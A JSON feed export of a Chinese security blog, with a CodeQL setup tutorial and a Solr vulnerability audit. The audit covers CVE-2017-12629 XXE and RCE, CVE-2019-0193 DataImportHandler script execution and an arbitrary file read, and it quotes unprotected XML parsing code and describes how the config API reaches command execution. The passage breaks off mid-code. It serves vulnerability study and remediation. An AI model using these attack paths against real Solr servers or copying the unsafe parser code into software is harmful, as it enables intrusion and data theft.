id=\"传送门\"><a class=\"markdownIt-Anchor\" href=\"#传送门\">#</a> 传送门</h1>\n<p><a href=\"https://lgtm.com/help/lgtm/console/ql-cpp-basic-example\">cpp 规则语法说明</a><br>\n<a href=\"https://docs.oracle.com/javase/7/docs/api/java/util/regex/Pattern.html\"> Java 正则模式</a><br>\n<a href=\"https://securitylab.github.com/research/cve-2018-4259-macos-nfs-vulnerability/\">给出的参考案例：CVE-2018-4259: MacOS NFS vulnerabilties lead to kernel RCE</a>（知识点挺多的）<br>\n<a href=\"https://bestwing.me/codeql.html\">codeql-swing</a>（swing 的语言云淡风轻，条理清晰，如沐春风，我的的语言阿巴阿巴阿巴）<br>\n<a href=\"https://github.com/github/securitylab/discussions\">讨论区</a></p>\n",
            "tags": [
                "CodeQL"
            ]
        },
        {
            "id": "http://example.com/2022/06/10/CodeQLforVSCode%E6%90%AD%E5%BB%BA%E6%B5%81%E7%A8%8B/",
            "url": "http://example.com/2022/06/10/CodeQLforVSCode%E6%90%AD%E5%BB%BA%E6%B5%81%E7%A8%8B/",
            "title": "CodeQLforVSCode搭建流程",
            "date_published": "2022-06-10T02:36:34.000Z",
            "content_html": "<p>[toc]</p>\n<h1 id=\"visual-studio-code安装\"><a class=\"markdownIt-Anchor\" href=\"#visual-studio-code安装\">#</a> Visual Studio Code 安装</h1>\n<p>都是免费的哈哈哈<br>\n<a href=\"https://code.visualstudio.com/Download\">官网下载</a><br>\n<img src=\"89f3979d3be08c5479bf1a9fac4ae8f4.png\" alt=\"89f3979d3be08c5479bf1a9fac4ae8f4.png\"></p>\n<h1 id=\"codeql安装\"><a class=\"markdownIt-Anchor\" href=\"#codeql安装\">#</a> CodeQL 安装</h1>\n<h2 id=\"使用chocolatey安装codeql-cli\"><a class=\"markdownIt-Anchor\" href=\"#使用chocolatey安装codeql-cli\">#</a> 使用 Chocolatey 安装 CodeQL cli</h2>\n<p>使用 choco 安装可透过指令执行且环境变数也会自动设定好<br>\n管理员权限打开 cmd<br>\n 运行 <code>choco install codeql</code> <br>\n<img src=\"8e97ed84bc39ad6f0c5ccda34d479d90.png\" alt=\"8e97ed84bc39ad6f0c5ccda34d479d90.png\"></p>\n<p>安装成功<br>\n<img src=\"c79f98196394ebe90a752eb4bf512411.png\" alt=\"c79f98196394ebe90a752eb4bf512411.png\"></p>\n<p>如果想要自定义安装目录的话，需要更改一下环境变量<br>\n ChocolateyInstall 就是默认的安装路径<br>\n<img src=\"03c3720b2dfed7a1702603e97ea56e19.png\" alt=\"03c3720b2dfed7a1702603e97ea56e19.png\"></p>\n<h2 id=\"gihub下载\"><a class=\"markdownIt-Anchor\" href=\"#gihub下载\">#</a> gihub 下载</h2>\n<p>先下载 codeql-cli<br>\n 选择对应操作系统下载即可<br>\n<img src=\"be05dbbd44da6e49e5a161a120478255.png\" alt=\"be05dbbd44da6e49e5a161a120478255.png\"></p>\n<p><a href=\"https://github.com/github/codeql-cli-binaries\">https://github.com/github/codeql-cli-binaries</a><br>\n 下载好解压至自己选定的文件夹，再添加系统变量<br>\n这里我将 codeql 文件夹名称改为 codeql-cli<br>\n<img src=\"cc76037dd0f7125ff2fa7ec3b2686824.png\" alt=\"cc76037dd0f7125ff2fa7ec3b2686824.png\"></p>\n<p>在命令行输入 codeql，如下图即配置成功<br>\n若提示找不到该命令，重启后再执行命令<br>\n<img src=\"f81317bf86bb5b8ece642a207391842b.png\" alt=\"f81317bf86bb5b8ece642a207391842b.png\"></p>\n<p>下载 codeql 规则库（使用 starter workspace 可跳过此步骤）<br>\n<a href=\"https://github.com/github/codeql\">https://github.com/github/codeql</a><br>\n 在 codeql 文件夹下打开 cmd<br>\n 执行 <code>git clone https://github.com/github/codeql codeql-repo</code> <br>\n 下载完后如图<br>\n<img src=\"3aeebb3aca934f76ef649ccf7d200fb6.png\" alt=\"3aeebb3aca934f76ef649ccf7d200fb6.png\"></p>\n<h1 id=\"下载之后安装codeql插件\"><a class=\"markdownIt-Anchor\" href=\"#下载之后安装codeql插件\">#</a> 下载之后安装 codeql 插件</h1>\n<p>有三种方法</p>\n<ol>\n<li>\n<p>在 VS 插件中搜索 codeql 点击安装<br>\n<img src=\"9536c545af16d13d030ff3c42f767471.png\" alt=\"9536c545af16d13d030ff3c42f767471.png\"></p>\n</li>\n<li>\n<p>浏览器打开<a href=\"https://marketplace.visualstudio.com/items?itemName=GitHub.vscode-codeql\">商城</a>下载</p>\n</li>\n<li>\n<p>github 中下载<a href=\"https://github.com/github/vscode-codeql/releases\"> VSIX 文件</a><br>\n在 more actions 中选择从 VSIX 文件安装<br>\n<img src=\"c748a4d35418471f99408284979433eb.png\" alt=\"c748a4d35418471f99408284979433eb.png\"></p>\n</li>\n</ol>\n<h1 id=\"配置codeql-cli\"><a class=\"markdownIt-Anchor\" href=\"#配置codeql-cli\">#</a> 配置 codeql-cli</h1>\n<p>终端无法访问扩展管理的 cli<br>\n 可以自己下载 codeql, 并在插件中配置路径<br>\n这样终端可以访问<br>\n这个插件是使用 codeql-cli 编译并运行规则的，要确保下载的版本支持该插件即可<br>\n<img src=\"64d75944e23735a29f128c932e7824b7.png\" alt=\"64d75944e23735a29f128c932e7824b7.png\"></p>\n<p>Executable Path 输入 codeql.exe 所在路径<br>\n<img src=\"9ab953a7697bf20458868981a2523a3c.png\" alt=\"9ab953a7697bf20458868981a2523a3c.png\"></p>\n<h1 id=\"配置规则\"><a class=\"markdownIt-Anchor\" href=\"#配置规则\">#</a> 配置规则</h1>\n<p>两种方法建立 codeql workspace<br>\n 第一种就是把要审计的代码放入 codeql 中<br>\n第二种是把 codeql 加入要审计的代码的 workspace 中</p>\n<h2 id=\"使用starter-workspace也就是git仓库\"><a class=\"markdownIt-Anchor\" href=\"#使用starter-workspace也就是git仓库\">#</a> 使用‘starter workspace’，也就是 git 仓库</h2>\n<ol>\n<li>\n<p>下载 starter<br>\n <code>git clone --recursive https://github.com/github/vscode-codeql-starter/</code> <br>\n 或者<br>\n <code>git clone https://github.com/github/vscode-codeql-starter/</code> <br>\n 项目下载完成后，进入项目目录<br>\n <code>git submodule update --init </code> <br>\n <code>git submodule update --remote</code> <br>\n 确保包含需要的子模块<br>\n截图使用的是第一种方法<br>\n<img src=\"c7bf21f2a552483780c58a4ee06b70a0\" alt=\"479934456f6c44228c2f3e8057ac0e86.png\"><br>\n 子模块需要定期更新<br>\n<img src=\"3c8180aaa0b040ecaafd4217cbc18503\" alt=\"ef88b51020a9d4ed8fdb5bda8029fc94.png\"></p>\n</li>\n<li>\n<p>在 VS Code 中打开 starter workspace<br>\n<img src=\"29486ddc144542318d779b859916c3fb\" alt=\"84a6738a5e83ddeb45752d064e986647.png\"><br>\n<img src=\"b02d0248007c458a8554fcc54a7d04ea\" alt=\"4e682ce5e87fbc0dd1897081928067fd.png\"></p>\n</li>\n</ol>\n<p>注意：<br>\nstarter 子模块中包括 C/C++, C#, Java, JavaScript, Python, Ruby 以及 GO 的规则，在 vscode-codeql-starter\\ql 下<br>\n CodeQL 暂时无法扫描 php 代码</p>\n<h2 id=\"将codeql规则库加入现有的工作站\"><a class=\"markdownIt-Anchor\" href=\"#将codeql规则库加入现有的工作站\">#</a> 将 CodeQL 规则库加入现有的工作站</h2>\n<p><strong>此种方法未实现，仅按文档进行流程说明</strong></p>\n<p>将下载好的本地 CodeQL 库加入你的 workspace<br>\n<a href=\"https://github.com/github/codeql\">CodeQL 库下载链接</a></p>\n<ol>\n<li>\n<p>选择 File &gt; Add Folder to Workspace，加入下载好的 codeql 库<br>\n<img src=\"3ccc9692c80a5e50bf93123ffbf04e4c.png\" alt=\"3ccc9692c80a5e50bf93123ffbf04e4c.png\"></p>\n</li>\n<li>\n<p>每种语言都要创建一个新的文件夹<br>\n通过 New Folder 或者 Add Folder to Workspace 选项<br>\n放置你的自定义规则和规则库</p>\n</li>\n<li>\n<p>在每个语言目录下新建一个 qlpack.yml 文件<br>\n用来告诉 CodeQL，这个目录下的语言类型和依赖包<br>\n例如：<br>\n在 C<ins> 代码目录下自定义一个 CodeQL 文件夹名为’my-custom-cpp-pack’<br>\n在 C</ins> 代码目录下创建一个 qlpack.yml 文件，内容如下</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name: my-custom-cpp-pack</span><br><span class=\"line\">version: 0.0.0</span><br><span class=\"line\">libraryPathDependencies: codeql/cpp-all</span><br></pre></td></tr></table></figure>\n<p><strong>注意：<br>\nGO 语言的规则库并不在 github/codeql 中<br>\n扫描 GO 代码，需要下载 https://github.com/github/codeql-go<br>\n 然后将规则像上面说的这样加入规则库<br>\n（starter 中都是包含的）</strong></p>\n<h1 id=\"运行codeql\"><a class=\"markdownIt-Anchor\" href=\"#运行codeql\">#</a> 运行 CodeQL</h1>\n<h2 id=\"选择数据库\"><a class=\"markdownIt-Anchor\" href=\"#选择数据库\">#</a> 选择数据库</h2>\n<p>扫描分析一个 project，我们需要建立一个 CodeQL 数据库<br>\n在侧边栏打开 CodeQL 数据库<br>\n如图有四种添加数据库的方法<br>\n<img src=\"b9557aadc5d02dcc220fc4f20977e102.png\" alt=\"b9557aadc5d02dcc220fc4f20977e102.png\"><br>\n 当添加数据库之后，会有数据库视图<br>\n可以右击列表中的项进行数据库交互<br>\n可以利用 Ctrl/Cmd+click 选择多个数据库</p>\n<h2 id=\"创建本地数据库\"><a class=\"markdownIt-Anchor\" href=\"#创建本地数据库\">#</a> 创建本地数据库</h2>\n<p>如果没有存在的数据库导入，也可以先创建一个本地数据库<br>\n有三种方法</p>\n<h3 id=\"通过coedql-cli创建一个数据库\"><a class=\"markdownIt-Anchor\" href=\"#通过coedql-cli创建一个数据库\">#</a> 通过 coedql-cli 创建一个数据库</h3>\n<pre><code>执行命令：\n`codeql database create &lt;database&gt; --language=&lt;language-identifier&gt;`\n</code></pre>\n<p>参数说明：<br>\n <code>&lt;database&gt;</code> ：创建数据库的路径，目录会在执行命令的时候被创建<br>\n <code>--language</code> : 指定数据库语言，输入标识符。当和–db-cluster 一起使用时，可以指定多个，用’,' 分隔，也可以进行多次指定。<br>\n <code>--db-cluster</code> ：为多种语言创建数据库<br>\n <code>--command</code> ：创建一个或多个编译语言数据库的时候使用。python 和 JavaScript/TypeScript 不需要该参数，如果编译语言不带该参数，codeql 会自动检测并编译<br>\n <code>--no-run-unnecessary-builds</code> ：为多语言创建数据库，且包括编译和非编译语言时，可以利用  <code>--no-run-unnecessary-builds</code>  来帮助非编译语言跳过 command 选项<br>\n<a href=\"https://codeql.github.com/docs/codeql-cli/manual/database-create/\">更多参数说明</a><br>\n CodeQL 支持以下语言</p>\n<table>\n<thead>\n<tr>\n<th>语言</th>\n<th>标识符</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>C/C++</td>\n<td>cpp</td>\n</tr>\n<tr>\n<td>C#</td>\n<td>csharp</td>\n</tr>\n<tr>\n<td>GO</td>\n<td>go</td>\n</tr>\n<tr>\n<td>Java</td>\n<td>java</td>\n</tr>\n<tr>\n<td>JavaScript/TypeScript</td>\n<td>javascript</td>\n</tr>\n<tr>\n<td>Python</td>\n<td>python</td>\n</tr>\n<tr>\n<td>Ruby</td>\n<td>ruby</td>\n</tr>\n</tbody>\n</table>\n<p>找了 codeql-repo 中的 python 案列测试创建数据库成功<br>\n<img src=\"48af0641ac03eb15ee8781d860f9e724.png\" alt=\"48af0641ac03eb15ee8781d860f9e724.png\"><br>\n<img src=\"18db53f51f1f4c80cbae05e19d286cb4.png\" alt=\"18db53f51f1f4c80cbae05e19d286cb4.png\"></p>\n<h4 id=\"官方给出的command案例\"><a class=\"markdownIt-Anchor\" href=\"#官方给出的command案例\">#</a> 官方给出的 command 案例</h4>\n<blockquote>\n<p>Specifying build commands</p>\n<p>The following examples are designed to give you an idea of some of the build commands that you can specify for compiled languages.</p>\n<blockquote>\n<p>Important</p>\n<p>The  <code>--command</code>  option accepts a single argument—if you need to use more than one command, specify  <code>--command</code>  multiple times.</p>\n<p>If you need to pass subcommands and options, the whole argument needs to be quoted to be interpreted correctly.</p>\n</blockquote>\n<ul>\n<li>\n<p>C/C++ project built using  <code>make</code> :</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codeql database create cpp-database --language=cpp --command=make</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>C# project built using  <code>dotnet build</code>  (.NET Core 3.0 or later):</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codeql database create csharp-database --language=csharp --command=&#x27;dotnet build /t:rebuild&#x27;</span><br></pre></td></tr></table></figure>\n<p>On Linux and macOS (but not Windows), you need to disable shared compilation when building C# projects with .NET Core 2 or earlier, so expand the command to:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codeql database create csharp-database --language=csharp --command=&#x27;dotnet build /p:UseSharedCompilation=false /t:rebuild&#x27;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>Go project built using the  <code>COEQL_EXTRACTOR_GO_BUILD_TRACING=on</code>  environment variable:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODEQL_EXTRACTOR_GO_BUILD_TRACING=on codeql database create go-database --language=go</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>Go project built using a custom build script:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codeql database create go-database --language=go --command=&#x27;./scripts/build.sh&#x27;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>Java project built using Gradle:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codeql database create java-database --language=java --command=&#x27;gradle clean test&#x27;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>Java project built using Maven:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codeql database create java-database --language=java --command=&#x27;mvn clean install&#x27;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>Java project built using Ant:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codeql database create java-database --language=java --command=&#x27;ant -f build.xml&#x27;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>Project built using Bazel:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Navigate to the Bazel workspace.</span><br><span class=\"line\"></span><br><span class=\"line\"># Before building, remove cached objects</span><br><span class=\"line\"># and stop all running Bazel server processes.</span><br><span class=\"line\">bazel clean --expunge</span><br><span class=\"line\"></span><br><span class=\"line\"># Build using the following Bazel flags, to help CodeQL detect the build:</span><br><span class=\"line\"># `--spawn_strategy=local`: build locally, instead of using a distributed build</span><br><span class=\"line\"># `--nouse_action_cache`: turn off build caching, which might prevent recompilation of source code</span><br><span class=\"line\"># `--noremote_accept_cached`, `--noremote_upload_local_results`: avoid using a remote cache</span><br><span class=\"line\">codeql database create new-database --language=&lt;language&gt; \\</span><br><span class=\"line\">  --command=&#x27;bazel build --spawn_strategy=local --nouse_action_cache --noremote_accept_cached --noremote_upload_local_results //path/to/package:target&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># After building, stop all running Bazel server processes.</span><br><span class=\"line\"># This ensures future build commands start in a clean Bazel server process</span><br><span class=\"line\"># without CodeQL attached.</span><br><span class=\"line\">bazel shutdown</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>Project built using a custom build script:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codeql database create new-database --language=&lt;language&gt; --command=&#x27;./scripts/build.sh&#x27;</span><br></pre></td></tr></table></figure>\n<p>This command runs a custom script that contains all of the commands required to build the project.</p>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"剩下两种方法未测试仅给出说明链接\"><a class=\"markdownIt-Anchor\" href=\"#剩下两种方法未测试仅给出说明链接\">#</a> 剩下两种方法未测试，仅给出<a href=\"https://codeql.github.com/docs/codeql-for-visual-studio-code/analyzing-your-projects/\">说明链接</a></h3>\n<h2 id=\"编写运行规则建议通过官方给出的练习题进行练习\"><a class=\"markdownIt-Anchor\" href=\"#编写运行规则建议通过官方给出的练习题进行练习\">#</a> 编写运行规则，建议通过官方给出的练习题进行练习</h2>\n<h1 id=\"传送门\"><a class=\"markdownIt-Anchor\" href=\"#传送门\">#</a> 传送门</h1>\n<p><a href=\"https://codeql.github.com/docs/\">CodeQL 官方文档</a><br>\n<a href=\"https://lab.github.com/githubtraining\">练习室</a></p>\n",
            "tags": [
                "codeql, 搭建教程"
            ]
        },
        {
            "id": "http://example.com/2022/06/10/solr%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/",
            "url": "http://example.com/2022/06/10/solr%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/",
            "title": "solr漏洞审计",
            "date_published": "2022-06-10T02:31:38.000Z",
            "content_html": "<h1 id=\"环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#环境搭建\">#</a> 环境搭建</h1>\n<p>各版本源码下载：<br>\n<a href=\"http://archive.apache.org/dist/lucene/solr/7.0.1/\">http://archive.apache.org/dist/lucene/solr/7.0.1/</a></p>\n<p>此处 win 环境，下载源码<br>\n<img src=\":/312d3247700c41e7bc385411a9e8ada5\" alt=\"d90b95d958f7a8aa03ec037e23ff6565.png\"></p>\n<p>在源码根目录打开 cmd，运行 <code>ant ivy-bootstrap</code> <br>\n<img src=\":/6f5d62f573e04359872a5e2d522769cb\" alt=\"65611596abbf48fd002528219ce04da6.png\"></p>\n<p>解压后用 idea 打开<br>\n<img src=\":/cba08f47dd2648029ea82c1667c0a32e\" alt=\"6398b74ee6a4f3388ea89aa77e051942.png\"></p>\n<p>（这里可以使用 ant 编译成 idea 项目后，再用 idea 直接打开，在项目根目录下运行 ant 命令即可）</p>\n<p>在 solr 目录下，运行 <code>ant server</code>  创建 solr server<br>\n<img src=\":/5c02f7c7549a46e2a814060569170417\" alt=\"568e847efbb2bd3f814629269b607938.png\"></p>\n<p>报错： <code>Could  not find file C:\\Users\\HAN91\\.ant\\lib\\ivy-2.3.0.jar to generate checksum</code> <br>\nivy 下载<br>\n<a href=\"http://ant.apache.org/ivy/download.cgi\"> http://ant.apache.org/ivy/download.cgi</a></p>\n<h1 id=\"漏洞原理\"><a class=\"markdownIt-Anchor\" href=\"#漏洞原理\">#</a> 漏洞原理</h1>\n<h2 id=\"cve-2017-12629\"><a class=\"markdownIt-Anchor\" href=\"#cve-2017-12629\">#</a> CVE-2017-12629</h2>\n<h3 id=\"xxe\"><a class=\"markdownIt-Anchor\" href=\"#xxe\">#</a> XXE</h3>\n<p>Lucene 包含了一个查询解析器支持 XML 格式进行数据查询，并且解析 xml 数据时，未设置任何防御措施，导致我们可引入任意恶意外部实体<br>\n而 Solr 由于使用 Lucenne 作为核心语义分析引擎，因此受到影响</p>\n<p>漏洞点：<br>\n <code>org.apache.lucene.queryparser.xml.CoreParser#parseXML</code> <br>\n 此处为解析 xml 数据的方法，其中并未包含任何 xxe 防御措施<br>\n因此可正常解析我们引入的恶意外部实体</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> Document <span class=\"title\">parseXML</span><span class=\"params\">(InputStream pXmlFile)</span> <span class=\"keyword\">throws</span> ParserException </span>&#123;</span><br><span class=\"line\">    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class=\"line\">    DocumentBuilder db = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">      db = dbf.newDocumentBuilder();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">catch</span> (Exception se) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> ParserException(<span class=\"string\">&quot;XML Parser configuration error&quot;</span>, se);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    org.w3c.dom.Document doc = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">      doc = db.parse(pXmlFile);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">catch</span> (Exception se) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> ParserException(<span class=\"string\">&quot;Error parsing XML stream:&quot;</span> + se, se);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> doc;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"漏洞修复\"><a class=\"markdownIt-Anchor\" href=\"#漏洞修复\">#</a> 漏洞修复</h3>\n<p>官方修复是增加 XXE 通用防御，这也是我们常用的 xxe 修复方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DocumentBuilderFactory.setFearture(<span class=\"string\">&quot;http://javax.xml.XMLConstants/feature/secure-processing&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>以下列出一些通过设置解析器行为，达到对 xxe 进行限制的方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这是优先选择. 如果不允许DTDs (doctypes) ,几乎可以阻止所有的XML实体攻击</span></span><br><span class=\"line\">setFeature(<span class=\"string\">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class=\"keyword\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果不能完全禁用DTDs，最少采取以下措施，必须两项同时存在</span></span><br><span class=\"line\">setFeature(<span class=\"string\">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class=\"keyword\">false</span>);<span class=\"comment\">// 防止外部实体POC</span></span><br><span class=\"line\">setFeature(<span class=\"string\">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class=\"keyword\">false</span>);<span class=\"comment\">// 防止参数实体POC</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"rce\"><a class=\"markdownIt-Anchor\" href=\"#rce\">#</a> RCE</h3>\n<p>RCE 需要使用到 SolrCloud Collections API，所以 RCE 只影响 Solrcloud 分布式系统</p>\n<p>漏洞点：<br>\n <code>org.apache.solr.core.RunExecutableListener#exec</code> <br>\n<img src=\":/51de3416f045459f909444415033be1f\" alt=\"0f16537ae621dca652c50598b2934616.png\"><br>\n 我们看见一下这行代码执行了命令，并传入了三个参数<br>\n <code>proc = Runtime.getRuntime().exec(cmd, envp ,dir);</code> <br>\n 查看 API<br>\ncmdarray：命令字符串<br>\n envp：代表 “环境” 变量设置，如果 envp 是 null ，则子进程继承当前进程的环境设置<br>\n dir：新子进程的工作目录由 dir 指定 。 如果 dir 是 null ，则子进程继承当前进程的当前工作目录。</p>\n<p><img src=\":/a75c9e8d1f58409c88e9f1ca628a3c1c\" alt=\"9ec0917d903603b1067a566e250c5627.png\"></p>\n<p>那么我们怎么才能控制以上这三个参数呢？<br>\n在初始化时，通过初始化传入的参数 args<br>\n 分别获得这三个参数 <code>cmd,dir,envp</code> <br>\n<img src=\":/2417a9d2aee24484b0d8d60a7945c5bf\" alt=\"eec102985f87ff2f05623f84d74ab34c.png\"></p>\n<p>找到调用 exec () 的有两处<br>\n <code>org.apache.solr.core.RunExecutableListener#postCommit</code> <br>\n <code>org.apache.solr.core.RunExecutableListener#newSearcher</code> <br>\n<img src=\":/3ce9c774ef2d49e5a5e2ebdf53c84848\" alt=\"c52c3a71430c5dd42e23cbf7eba7973e.png\"></p>\n<p>因此我们可以 config API 调用以上两个命令执行命令<br>\n关于 config API 更多信息可查看传送门中放置的官网链接<br>\n<img src=\":/4c612e57459d403384463b4165fc4786\" alt=\"fa07883023d57f29334905273587cf9b.png\"></p>\n<h3 id=\"漏洞修复-2\"><a class=\"markdownIt-Anchor\" href=\"#漏洞修复-2\">#</a> 漏洞修复</h3>\n<p>官方修复直接将该类删除</p>\n<h2 id=\"cve-2019-0193\"><a class=\"markdownIt-Anchor\" href=\"#cve-2019-0193\">#</a> CVE-2019-0193</h2>\n<p>DataImportHandler 是一个可选但流行的模块，用于从数据库和其他来源提取数据。它有一个特性，即整个 DIH (the Data Import Handler, 数据导入处理程序) 配置可以来自请求的 <code>dataConfig</code>  参数</p>\n<p>DIH 管理屏幕的调试模式使用它来方便 DIH 配置的调试 / 开发。因为 DIH 配置可以包含脚本，并未对脚本进行任何过滤检测，所以这个参数存在安全风险</p>\n<p>从 Solr 的 8.2.0 版本开始，使用这个参数需要将 Java System 属性  <code>enable.dih.dataConfigParam</code>  设置为  <code>true</code> ，此时也将存在该漏洞</p>\n<p>DHI 和 script 官方文档链接放在传送门中</p>\n<p>我们可以根据官方文档的说明，插入脚本并执行，其中 entity 标签支持 jndi 以及 script<br>\n<img src=\":/9366ca25d9524160843ca21a3d69b18d\" alt=\"a6303a016339679c882babc40deace8b.png\"><br>\n 漏洞点：<br>\n <code>org.apache.solr.handler.dataimport.DataImportHandler</code> <br>\n 其中 <code>handleRequestBody()</code>  函数接收了前端传入的 <code>dataConfig</code> <br>\n<img src=\":/5136fb3fb5994945a840fa8c82b62825\" alt=\"08710fb1d7d531e129962d80bb22941e.png\"><br>\n 后面就不再分析了，因为这个漏洞是 solr 该模块允许执行脚本，官方文档中也描述了该模块以及脚本的使用</p>\n<h3 id=\"漏洞修复-3\"><a class=\"markdownIt-Anchor\" href=\"#漏洞修复-3\">#</a> 漏洞修复</h3>\n<p>官方修复增加 <code>enable.dih.dataConfigParam</code>  参数，默认 = false，仅在启动 solr 时带上参数 <code>enable.dih.dataConfigParam=true</code>  才可启动 debug 模式</p>\n<h2 id=\"remote-streaming-fileread任意文件读取\"><a class=\"markdownIt-Anchor\" href=\"#remote-streaming-fileread任意文件读取\">#</a> Remote-Streaming-Fileread（任意文件读取）</h2>\n<p>官方文档中写明，solrconfig.xml 中 <code>enableRemoteStreaming=&quot;true&quot;</code>  时允许远程流<br>\n<img src=\":/b53eef83d3f047f78ea7b9607b951e0f\" alt=\"d4e2c6715cd93bccb5ba0645bf44d89c.png\"><br>\n 因此我们可以通过 config API，启用远程读取流<br>\n <code>enableRemoteStreaming = “true”</code> ，将允许任何人向任何 URL 或本地文件发送请求<br>\n <code>DumpRequestHandler = “true”</code> ，它将允许任何人查看系统上的任何文件。<br>\n漏洞点：<br>\n <code>solr/core/src/java/org/apache/solr/servlet/SolrRequestParsers.java</code> <br>\n<img src=\":/60256974dd3742f98a58144d8dd67750\" alt=\"d9c8060b808d32f29db7535380472c6e.png\"><br>\n 其中通过以下代码获取前端传入数据</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strs = params.getParams( CommonParams.STREAM_FILE );</span><br></pre></td></tr></table></figure>\n<p>在进行文件获取时，未对传入的 strs 进行任何检测和过滤，并生成 stream</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>( <span class=\"keyword\">final</span> String file : strs ) &#123;</span><br><span class=\"line\">        ContentStreamBase stream = <span class=\"keyword\">new</span> ContentStreamBase.FileStream( <span class=\"keyword\">new</span> File(file) );</span><br><span class=\"line\">        <span class=\"keyword\">if</span>( contentType != <span 